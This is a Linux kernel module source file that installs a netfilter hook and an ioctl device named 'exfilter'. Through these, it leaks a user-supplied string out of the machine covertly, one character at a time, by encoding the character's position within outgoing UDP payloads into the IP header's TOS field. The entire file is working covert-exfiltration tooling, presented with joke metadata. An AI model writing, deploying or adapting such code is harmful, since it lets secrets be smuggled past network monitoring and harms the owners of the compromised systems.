#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <linux/fs.h>
#include <linux/miscdevice.h>

MODULE_LICENSE("WTF");
MODULE_AUTHOR("Pozdner Yaderkovich");
MODULE_DESCRIPTION("Keks");
MODULE_VERSION("1.0");

#define DEVICE_NAME "packet_injector"
#define IOCTL_SET_STRING _IOW('p', 1, char *)

static struct nf_hook_ops netfilter_ops;
static char user_string[100] = "bebrosik\x00";  // String injected into packets

/* Function to modify packets by injecting a string into the payload */
static unsigned int modify_packet_out(void *priv,
                                      struct sk_buff *skb,
                                      const struct nf_hook_state *state)
{
    struct iphdr *iph;
    struct udphdr *udph;
    char *data;
    int data_len;
    int idx = 0;
    int cur_string_idx = strlen(user_string) - 1;

    iph = ip_hdr(skb);
    if (!iph) {
        return NF_ACCEPT;
    }

    // Check if it's a UDP packet
    if (iph->protocol == IPPROTO_UDP && strlen(user_string) > 0) {

        udph = (struct udphdr *)((__u32 *)iph + iph->ihl);
        data = (char *)udph + sizeof(struct udphdr);  // Get the UDP payload
        data_len = ntohs(udph->len) - sizeof(struct udphdr);  // Length of the UDP payload

        for (idx = 0; idx < data_len; idx++) {
            if (data[idx] == user_string[cur_string_idx]) {
                user_string[cur_string_idx] = '\0';
                iph->tos = idx + 1;
                iph->check = 0;
                iph->check = ip_fast_csum((unsigned char*)iph, iph->ihl);
                break;
            }
        }
    }

    return NF_ACCEPT;
}

/* IOCTL handler */
static long packet_injector_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
{
    char buf[100];

    switch (cmd) {
        case IOCTL_SET_STRING:
            if (copy_from_user(buf, (char __user *)arg, sizeof(buf))) {
                return -EFAULT;
            }

            buf[sizeof(buf) - 1] = '\0';  // Ensure null-termination
            strncpy(user_string, buf, sizeof(user_string) - 1);
            user_string[sizeof(user_string) - 1] = '\0';
            break;

        default:
            return -EINVAL;
    }

    return 0;
}

static struct file_operations exfilter_fops = {.unlocked_ioctl = packet_injector_ioctl};

struct miscdevice exfilter_dev = {
    .minor = MISC_DYNAMIC_MINOR,
    .name = "exfilter",
    .fops = &exfilter_fops,
};

/* Module initialization function */
static int __init mod_init(void)
{
    int ret;

    // Register the Netfilter hook
    netfilter_ops.hook = modify_packet_out;
    netfilter_ops.pf = PF_INET;
    netfilter_ops.hooknum = NF_INET_POST_ROUTING;
    netfilter_ops.priority = NF_IP_PRI_FIRST;

    nf_register_net_hook(&init_net, &netfilter_ops);

    ret = misc_register(&exfilter_dev);
    return 0;
}

/* Module cleanup function */
static void __exit mod_exit(void)
{
    printk(KERN_INFO "Unloading packet modification module.\n");

    // Unregister Netfilter hook
    nf_unregister_net_hook(&init_net, &netfilter_ops);

    // Remove device
    misc_deregister(&exfilter_dev);
}

module_init(mod_init);
module_exit(mod_exit);